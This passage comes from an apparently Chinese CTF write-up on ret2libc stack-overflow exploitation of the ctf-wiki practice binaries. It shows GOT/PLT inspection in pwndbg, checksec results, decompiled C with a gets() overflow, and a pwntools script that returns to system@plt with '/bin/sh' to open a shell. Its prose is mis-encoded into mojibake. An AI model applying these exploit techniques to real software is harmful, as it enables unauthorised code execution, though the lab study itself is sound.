</span><span class=lnt id=hl-8-25><a class=lnlinks href=#hl-8-25>25</a>
</span><span class=lnt id=hl-8-26><a class=lnlinks href=#hl-8-26>26</a>
</span><span class=lnt id=hl-8-27><a class=lnlinks href=#hl-8-27>27</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; got
</span></span><span class=line><span class=cl>Filtering out read-only entries <span class=o>(</span>display them with -r or --show-readonly<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>State of the GOT of /home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1:
</span></span><span class=line><span class=cl>GOT protection: Partial RELRO <span class=p>|</span> Found <span class=m>10</span> GOT entries passing the filter
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a00c<span class=o>]</span> gets@GLIBC_2.0 -&gt; 0x8048436 <span class=o>(</span>gets@plt+6<span class=o>)</span> â—‚â€” push <span class=m>0</span> /* <span class=s1>&#39;h&#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a010<span class=o>]</span> time@GLIBC_2.0 -&gt; 0x8048446 <span class=o>(</span>time@plt+6<span class=o>)</span> â—‚â€” push <span class=m>8</span>
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a014<span class=o>]</span> puts@GLIBC_2.0 -&gt; 0x8048456 <span class=o>(</span>puts@plt+6<span class=o>)</span> â—‚â€” push 0x10
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a018<span class=o>]</span> system@GLIBC_2.0 -&gt; 0x8048466 <span class=o>(</span>system@plt+6<span class=o>)</span> â—‚â€” push 0x18
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a01c<span class=o>]</span> __gmon_start__ -&gt; 0x8048476 <span class=o>(</span>__gmon_start__@plt+6<span class=o>)</span> â—‚â€” push 0x20 /* <span class=s1>&#39;h &#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a020<span class=o>]</span> srand@GLIBC_2.0 -&gt; 0x8048486 <span class=o>(</span>srand@plt+6<span class=o>)</span> â—‚â€” push 0x28 /* <span class=s1>&#39;h(&#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a024<span class=o>]</span> __libc_start_main@GLIBC_2.0 -&gt; 0xf7d605c0 <span class=o>(</span>__libc_start_main<span class=o>)</span> â—‚â€” endbr32
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a028<span class=o>]</span> setvbuf@GLIBC_2.0 -&gt; 0xf7dbb8a0 <span class=o>(</span>setvbuf<span class=o>)</span> â—‚â€” endbr32
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a02c<span class=o>]</span> rand@GLIBC_2.0 -&gt; 0x80484b6 <span class=o>(</span>rand@plt+6<span class=o>)</span> â—‚â€” push 0x40 /* <span class=s1>&#39;h@&#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a030<span class=o>]</span> __isoc99_scanf@GLIBC_2.7 -&gt; 0x80484c6 <span class=o>(</span>__isoc99_scanf@plt+6<span class=o>)</span> â—‚â€” push 0x48 /* <span class=s1>&#39;hH&#39;</span> */
</span></span><span class=line><span class=cl>pwndbg&gt; plt
</span></span><span class=line><span class=cl>Section .plt 0x8048420-0x80484d0:
</span></span><span class=line><span class=cl>0x8048430: gets@plt
</span></span><span class=line><span class=cl>0x8048440: time@plt
</span></span><span class=line><span class=cl>0x8048450: puts@plt
</span></span><span class=line><span class=cl>0x8048460: system@plt
</span></span><span class=line><span class=cl>0x8048470: __gmon_start__@plt
</span></span><span class=line><span class=cl>0x8048480: srand@plt
</span></span><span class=line><span class=cl>0x8048490: __libc_start_main@plt
</span></span><span class=line><span class=cl>0x80484a0: setvbuf@plt
</span></span><span class=line><span class=cl>0x80484b0: rand@plt
</span></span><span class=line><span class=cl>0x80484c0: __isoc99_scanf@plt</span></span></code></pre></td></tr></table></div></div><p>åˆæ¬¡è°ƒç”¨ <code>puts</code> å‡½æ•°ä¼šè¿›è¡Œå»¶è¿Ÿç»‘å®š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-9-1><a class=lnlinks href=#hl-9-1> 1</a>
</span><span class=lnt id=hl-9-2><a class=lnlinks href=#hl-9-2> 2</a>
</span><span class=lnt id=hl-9-3><a class=lnlinks href=#hl-9-3> 3</a>
</span><span class=lnt id=hl-9-4><a class=lnlinks href=#hl-9-4> 4</a>
</span><span class=lnt id=hl-9-5><a class=lnlinks href=#hl-9-5> 5</a>
</span><span class=lnt id=hl-9-6><a class=lnlinks href=#hl-9-6> 6</a>
</span><span class=lnt id=hl-9-7><a class=lnlinks href=#hl-9-7> 7</a>
</span><span class=lnt id=hl-9-8><a class=lnlinks href=#hl-9-8> 8</a>
</span><span class=lnt id=hl-9-9><a class=lnlinks href=#hl-9-9> 9</a>
</span><span class=lnt id=hl-9-10><a class=lnlinks href=#hl-9-10>10</a>
</span><span class=lnt id=hl-9-11><a class=lnlinks href=#hl-9-11>11</a>
</span><span class=lnt id=hl-9-12><a class=lnlinks href=#hl-9-12>12</a>
</span><span class=lnt id=hl-9-13><a class=lnlinks href=#hl-9-13>13</a>
</span><span class=lnt id=hl-9-14><a class=lnlinks href=#hl-9-14>14</a>
</span><span class=lnt id=hl-9-15><a class=lnlinks href=#hl-9-15>15</a>
</span><span class=lnt id=hl-9-16><a class=lnlinks href=#hl-9-16>16</a>
</span><span class=lnt id=hl-9-17><a class=lnlinks href=#hl-9-17>17</a>
</span><span class=lnt id=hl-9-18><a class=lnlinks href=#hl-9-18>18</a>
</span><span class=lnt id=hl-9-19><a class=lnlinks href=#hl-9-19>19</a>
</span><span class=lnt id=hl-9-20><a class=lnlinks href=#hl-9-20>20</a>
</span><span class=lnt id=hl-9-21><a class=lnlinks href=#hl-9-21>21</a>
</span><span class=lnt id=hl-9-22><a class=lnlinks href=#hl-9-22>22</a>
</span><span class=lnt id=hl-9-23><a class=lnlinks href=#hl-9-23>23</a>
</span><span class=lnt id=hl-9-24><a class=lnlinks href=#hl-9-24>24</a>
</span><span class=lnt id=hl-9-25><a class=lnlinks href=#hl-9-25>25</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class=o>[</span> DISASM / i386 / <span class=nb>set</span> emulate on <span class=o>]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span class=line><span class=cl> â–º 0x8048450  &lt;puts@plt&gt;       jmp    dword ptr <span class=o>[</span>0x804a014<span class=o>]</span>       &lt;puts@plt+6&gt;
</span></span><span class=line><span class=cl>    â†“
</span></span><span class=line><span class=cl>   0x8048456  &lt;puts@plt+6&gt;     push   0x10
</span></span><span class=line><span class=cl>   0x804845b  &lt;puts@plt+11&gt;    jmp    0x8048420                   &lt;0x8048420&gt;
</span></span><span class=line><span class=cl>    â†“
</span></span><span class=line><span class=cl>   0x8048420                   push   dword ptr <span class=o>[</span>0x804a004<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x8048426                   jmp    dword ptr <span class=o>[</span>0x804a008<span class=o>]</span>       &lt;0xf7fd8640&gt;
</span></span><span class=line><span class=cl>    â†“
</span></span><span class=line><span class=cl>   0xf7fd8640                  push   eax
</span></span><span class=line><span class=cl>   0xf7fd8641                  push   ecx
</span></span><span class=line><span class=cl>   0xf7fd8642                  push   edx
</span></span><span class=line><span class=cl>   0xf7fd8643                  mov    edx, dword ptr <span class=o>[</span>esp + 0x10<span class=o>]</span>     EDX, <span class=o>[</span>0xffffcc08<span class=o>]</span> <span class=o>=</span>&gt; 0x10
</span></span><span class=line><span class=cl>   0xf7fd8647                  mov    eax, dword ptr <span class=o>[</span>esp + 0xc<span class=o>]</span>      EAX, <span class=o>[</span>0xffffcc04<span class=o>]</span> <span class=o>=</span>&gt; 0xf7ffda60 â—‚â€” <span class=m>0</span>
</span></span><span class=line><span class=cl>   0xf7fd864b                  call   0xf7fd6500                  &lt;0xf7fd6500&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwndbg&gt; tele 0x804a000
</span></span><span class=line><span class=cl>00:0000â”‚  0x804a000 <span class=o>(</span>_GLOBAL_OFFSET_TABLE_<span class=o>)</span> â€”â–¸ 0x8049f14 <span class=o>(</span>_DYNAMIC<span class=o>)</span> â—‚â€” <span class=m>1</span>
</span></span><span class=line><span class=cl>01:0004â”‚  0x804a004 <span class=o>(</span>_GLOBAL_OFFSET_TABLE_+4<span class=o>)</span> â€”â–¸ 0xf7ffda60 â—‚â€” <span class=m>0</span>
</span></span><span class=line><span class=cl>02:0008â”‚  0x804a008 <span class=o>(</span>_GLOBAL_OFFSET_TABLE_+8<span class=o>)</span> â€”â–¸ 0xf7fd8640 â—‚â€” push eax
</span></span><span class=line><span class=cl>03:000câ”‚  0x804a00c <span class=o>(</span>gets@got<span class=o>[</span>plt<span class=o>])</span> â€”â–¸ 0x8048436 <span class=o>(</span>gets@plt+6<span class=o>)</span> â—‚â€” push <span class=m>0</span> /* <span class=s1>&#39;h&#39;</span> */
</span></span><span class=line><span class=cl>04:0010â”‚  0x804a010 <span class=o>(</span>time@got<span class=o>[</span>plt<span class=o>])</span> â€”â–¸ 0x8048446 <span class=o>(</span>time@plt+6<span class=o>)</span> â—‚â€” push <span class=m>8</span>
</span></span><span class=line><span class=cl>05:0014â”‚  0x804a014 <span class=o>(</span>puts@got<span class=o>[</span>plt<span class=o>])</span> â€”â–¸ 0x8048456 <span class=o>(</span>puts@plt+6<span class=o>)</span> â—‚â€” push 0x10
</span></span><span class=line><span class=cl>06:0018â”‚  0x804a018 <span class=o>(</span>system@got<span class=o>[</span>plt<span class=o>])</span> â€”â–¸ 0x8048466 <span class=o>(</span>system@plt+6<span class=o>)</span> â—‚â€” push 0x18
</span></span><span class=line><span class=cl>07:001câ”‚  0x804a01c <span class=o>(</span>__gmon_start__@got.plt<span class=o>)</span> â€”â–¸ 0x8048476 <span class=o>(</span>__gmon_start__@plt+6<span class=o>)</span> â—‚â€” push 0x20 /* <span class=s1>&#39;h &#39;</span> */</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œçš„ <code>02:0008â”‚ 0x804a008 (_GLOBAL_OFFSET_TABLE_+8) â€”â–¸ 0xf7fd8640 â—‚â€” push eax</code> å°±æ˜¯ <code>_dl_runtime_resolve</code> å‡½æ•°çš„åœ°å€, è´Ÿè´£ç¬¦å·è§£æå’Œé‡å®šä½å·¥ä½œ</p><p>å¯ä»¥çœ‹åˆ°æ‰€æœ‰è¿˜æ²¡ç»‘å®šçš„å‡½æ•° got æŒ‡å‘ plt+6 å¤„çš„æŒ‡ä»¤ï¼Œå½“å»¶è¿Ÿç»‘å®šä¹‹å got ç›´æ¥æŒ‡å‘äº†å‡½æ•°çš„å®é™…åœ°å€</p><p><code>puts</code> å®Œæˆå»¶è¿Ÿç»‘å®šå</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-10-1><a class=lnlinks href=#hl-10-1> 1</a>
</span><span class=lnt id=hl-10-2><a class=lnlinks href=#hl-10-2> 2</a>
</span><span class=lnt id=hl-10-3><a class=lnlinks href=#hl-10-3> 3</a>
</span><span class=lnt id=hl-10-4><a class=lnlinks href=#hl-10-4> 4</a>
</span><span class=lnt id=hl-10-5><a class=lnlinks href=#hl-10-5> 5</a>
</span><span class=lnt id=hl-10-6><a class=lnlinks href=#hl-10-6> 6</a>
</span><span class=lnt id=hl-10-7><a class=lnlinks href=#hl-10-7> 7</a>
</span><span class=lnt id=hl-10-8><a class=lnlinks href=#hl-10-8> 8</a>
</span><span class=lnt id=hl-10-9><a class=lnlinks href=#hl-10-9> 9</a>
</span><span class=lnt id=hl-10-10><a class=lnlinks href=#hl-10-10>10</a>
</span><span class=lnt id=hl-10-11><a class=lnlinks href=#hl-10-11>11</a>
</span><span class=lnt id=hl-10-12><a class=lnlinks href=#hl-10-12>12</a>
</span><span class=lnt id=hl-10-13><a class=lnlinks href=#hl-10-13>13</a>
</span><span class=lnt id=hl-10-14><a class=lnlinks href=#hl-10-14>14</a>
</span><span class=lnt id=hl-10-15><a class=lnlinks href=#hl-10-15>15</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; got
</span></span><span class=line><span class=cl>Filtering out read-only entries <span class=o>(</span>display them with -r or --show-readonly<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>State of the GOT of /home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1:
</span></span><span class=line><span class=cl>GOT protection: Partial RELRO <span class=p>|</span> Found <span class=m>10</span> GOT entries passing the filter
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a00c<span class=o>]</span> gets@GLIBC_2.0 -&gt; 0x8048436 <span class=o>(</span>gets@plt+6<span class=o>)</span> â—‚â€” push <span class=m>0</span> /* <span class=s1>&#39;h&#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a010<span class=o>]</span> time@GLIBC_2.0 -&gt; 0x8048446 <span class=o>(</span>time@plt+6<span class=o>)</span> â—‚â€” push <span class=m>8</span>
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a014<span class=o>]</span> puts@GLIBC_2.0 -&gt; 0xf7dbaf60 <span class=o>(</span>puts<span class=o>)</span> â—‚â€” endbr32
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a018<span class=o>]</span> system@GLIBC_2.0 -&gt; 0x8048466 <span class=o>(</span>system@plt+6<span class=o>)</span> â—‚â€” push 0x18
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a01c<span class=o>]</span> __gmon_start__ -&gt; 0x8048476 <span class=o>(</span>__gmon_start__@plt+6<span class=o>)</span> â—‚â€” push 0x20 /* <span class=s1>&#39;h &#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a020<span class=o>]</span> srand@GLIBC_2.0 -&gt; 0x8048486 <span class=o>(</span>srand@plt+6<span class=o>)</span> â—‚â€” push 0x28 /* <span class=s1>&#39;h(&#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a024<span class=o>]</span> __libc_start_main@GLIBC_2.0 -&gt; 0xf7d605c0 <span class=o>(</span>__libc_start_main<span class=o>)</span> â—‚â€” endbr32
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a028<span class=o>]</span> setvbuf@GLIBC_2.0 -&gt; 0xf7dbb8a0 <span class=o>(</span>setvbuf<span class=o>)</span> â—‚â€” endbr32
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a02c<span class=o>]</span> rand@GLIBC_2.0 -&gt; 0x80484b6 <span class=o>(</span>rand@plt+6<span class=o>)</span> â—‚â€” push 0x40 /* <span class=s1>&#39;h@&#39;</span> */
</span></span><span class=line><span class=cl><span class=o>[</span>0x804a030<span class=o>]</span> __isoc99_scanf@GLIBC_2.7 -&gt; 0x80484c6 <span class=o>(</span>__isoc99_scanf@plt+6<span class=o>)</span> â—‚â€” push 0x48 /* <span class=s1>&#39;hH&#39;</span> */</span></span></code></pre></td></tr></table></div></div><h2 id=ret2libc>ret2libc
<a class=header-anchor href=#ret2libc></a></h2><h3 id=ret2libc1>ret2libc1
<a class=header-anchor href=#ret2libc1></a></h3><p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1 title=ret2libc1 rel="noopener external nofollow noreferrer" target=_blank class=exturl>ret2libc1
<i class="fa fa-external-link-alt"></i></a></p><p>å®‰å…¨æ£€æŸ¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-11-1><a class=lnlinks href=#hl-11-1>1</a>
</span><span class=lnt id=hl-11-2><a class=lnlinks href=#hl-11-2>2</a>
</span><span class=lnt id=hl-11-3><a class=lnlinks href=#hl-11-3>3</a>
</span><span class=lnt id=hl-11-4><a class=lnlinks href=#hl-11-4>4</a>
</span><span class=lnt id=hl-11-5><a class=lnlinks href=#hl-11-5>5</a>
</span><span class=lnt id=hl-11-6><a class=lnlinks href=#hl-11-6>6</a>
</span><span class=lnt id=hl-11-7><a class=lnlinks href=#hl-11-7>7</a>
</span><span class=lnt id=hl-11-8><a class=lnlinks href=#hl-11-8>8</a>
</span><span class=lnt id=hl-11-9><a class=lnlinks href=#hl-11-9>9</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ pwn checksec ./ret2libc1             <span class=o>(</span>.venv<span class=o>)</span> master âœ± â—¼
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1&#39;</span>
</span></span><span class=line><span class=cl>    Arch:       i386-32-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span><span class=line><span class=cl>    Debuginfo:  Yes</span></span></code></pre></td></tr></table></div></div><p>é™æ€åˆ†æï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-12-1><a class=lnlinks href=#hl-12-1> 1</a>
</span><span class=lnt id=hl-12-2><a class=lnlinks href=#hl-12-2> 2</a>
</span><span class=lnt id=hl-12-3><a class=lnlinks href=#hl-12-3> 3</a>
</span><span class=lnt id=hl-12-4><a class=lnlinks href=#hl-12-4> 4</a>
</span><span class=lnt id=hl-12-5><a class=lnlinks href=#hl-12-5> 5</a>
</span><span class=lnt id=hl-12-6><a class=lnlinks href=#hl-12-6> 6</a>
</span><span class=lnt id=hl-12-7><a class=lnlinks href=#hl-12-7> 7</a>
</span><span class=lnt id=hl-12-8><a class=lnlinks href=#hl-12-8> 8</a>
</span><span class=lnt id=hl-12-9><a class=lnlinks href=#hl-12-9> 9</a>
</span><span class=lnt id=hl-12-10><a class=lnlinks href=#hl-12-10>10</a>
</span><span class=lnt id=hl-12-11><a class=lnlinks href=#hl-12-11>11</a>
</span><span class=lnt id=hl-12-12><a class=lnlinks href=#hl-12-12>12</a>
</span><span class=lnt id=hl-12-13><a class=lnlinks href=#hl-12-13>13</a>
</span><span class=lnt id=hl-12-14><a class=lnlinks href=#hl-12-14>14</a>
</span><span class=lnt id=hl-12-15><a class=lnlinks href=#hl-12-15>15</a>
</span><span class=lnt id=hl-12-16><a class=lnlinks href=#hl-12-16>16</a>
</span><span class=lnt id=hl-12-17><a class=lnlinks href=#hl-12-17>17</a>
</span><span class=lnt id=hl-12-18><a class=lnlinks href=#hl-12-18>18</a>
</span><span class=lnt id=hl-12-19><a class=lnlinks href=#hl-12-19>19</a>
</span><span class=lnt id=hl-12-20><a class=lnlinks href=#hl-12-20>20</a>
</span><span class=lnt id=hl-12-21><a class=lnlinks href=#hl-12-21>21</a>
</span><span class=lnt id=hl-12-22><a class=lnlinks href=#hl-12-22>22</a>
</span><span class=lnt id=hl-12-23><a class=lnlinks href=#hl-12-23>23</a>
</span><span class=lnt id=hl-12-24><a class=lnlinks href=#hl-12-24>24</a>
</span><span class=lnt id=hl-12-25><a class=lnlinks href=#hl-12-25>25</a>
</span><span class=lnt id=hl-12-26><a class=lnlinks href=#hl-12-26>26</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+1Ch] [ebp-64h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;RET2LIBC &gt;_&lt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>rodata</span><span class=p>:</span><span class=mi>08048720</span> <span class=n>aBinSh</span>          <span class=n>db</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=err>&#39;</span><span class=p>,</span><span class=mi>0</span>          <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=n>shell</span><span class=err>â†“</span><span class=n>o</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>secure</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>time_t</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>input</span><span class=p>;</span> <span class=c1>// [esp+18h] [ebp-10h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>secretcode</span><span class=p>;</span> <span class=c1>// [esp+1Ch] [ebp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v0</span> <span class=o>=</span> <span class=nf>time</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>v0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>secretcode</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nf>__isoc99_scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>input</span> <span class=o>==</span> <span class=n>secretcode</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;shell!?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>æœ‰ <code>system</code> å‡½æ•°å’Œ <code>/bin/sh</code> å­—ç¬¦ä¸², ç›´æ¥æ ˆæº¢å‡º</p><p>payload.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-13-1><a class=lnlinks href=#hl-13-1> 1</a>
</span><span class=lnt id=hl-13-2><a class=lnlinks href=#hl-13-2> 2</a>
</span><span class=lnt id=hl-13-3><a class=lnlinks href=#hl-13-3> 3</a>
</span><span class=lnt id=hl-13-4><a class=lnlinks href=#hl-13-4> 4</a>
</span><span class=lnt id=hl-13-5><a class=lnlinks href=#hl-13-5> 5</a>
</span><span class=lnt id=hl-13-6><a class=lnlinks href=#hl-13-6> 6</a>
</span><span class=lnt id=hl-13-7><a class=lnlinks href=#hl-13-7> 7</a>
</span><span class=lnt id=hl-13-8><a class=lnlinks href=#hl-13-8> 8</a>
</span><span class=lnt id=hl-13-9><a class=lnlinks href=#hl-13-9> 9</a>
</span><span class=lnt id=hl-13-10><a class=lnlinks href=#hl-13-10>10</a>
</span><span class=lnt id=hl-13-11><a class=lnlinks href=#hl-13-11>11</a>
</span><span class=lnt id=hl-13-12><a class=lnlinks href=#hl-13-12>12</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&#34;./ret2libc1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;kitty&#34;</span><span class=p>,</span> <span class=s2>&#34;@&#34;</span><span class=p>,</span> <span class=s2>&#34;launch&#34;</span><span class=p>,</span> <span class=s2>&#34;--type=window&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>system_plt</span> <span class=o>=</span> <span class=mh>0x08048460</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=mh>0x08048720</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span> <span class=o>*</span> <span class=mi>112</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>system_plt</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>åœ¨è°ƒç”¨å‡½æ•°æ—¶åº”è¯¥å¡«å…¥ plt çš„åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•çŸ¥é“ got åœ°å€
.plt.got æ®µçš„ <code>system</code> ä¸­å­˜çš„æ˜¯ <code>system_got</code>, ä¸æ˜¯ <code>system</code> å‡½æ•°çš„æŒ‡ä»¤</p><p>åœ¨ 32 ä½ç¨‹åºä¸‹ï¼Œ<code>system_plt</code> åé¢çš„åœ°å€å°†è¢«å½“ä½œè¿”å›åœ°å€å‹å…¥æ ˆä¸­</p><h3 id=ret2libc2>ret2libc2
<a class=header-anchor href=#ret2libc2></a></h3><p><a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2 title=ret2libc2 rel="noopener external nofollow noreferrer" target=_blank class=exturl>ret2libc2
<i class="fa fa-external-link-alt"></i></a></p><p>å®‰å…¨æ£€æŸ¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-14-1><a class=lnlinks href=#hl-14-1>1</a>
</span><span class=lnt id=hl-14-2><a class=lnlinks href=#hl-14-2>2</a>
</span><span class=lnt id=hl-14-3><a class=lnlinks href=#hl-14-3>3</a>
</span><span class=lnt id=hl-14-4><a class=lnlinks href=#hl-14-4>4</a>
</span><span class=lnt id=hl-14-5><a class=lnlinks href=#hl-14-5>5</a>
</span><span class=lnt id=hl-14-6><a class=lnlinks href=#hl-14-6>6</a>
</span><span class=lnt id=hl-14-7><a class=lnlinks href=#hl-14-7>7</a>
</span><span class=lnt id=hl-14-8><a class=lnlinks href=#hl-14-8>8</a>
</span><span class=lnt id=hl-14-9><a class=lnlinks href=#hl-14-9>9</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwn checksec ./ret2libc2             <span class=o>(</span>.venv<span class=o>)</span> master âœ± â—¼
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2/ret2libc2&#39;</span>
</span></span><span class=line><span class=cl>    Arch:       i386-32-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</span></span><span class=line><span class=cl>    Stripped:   No
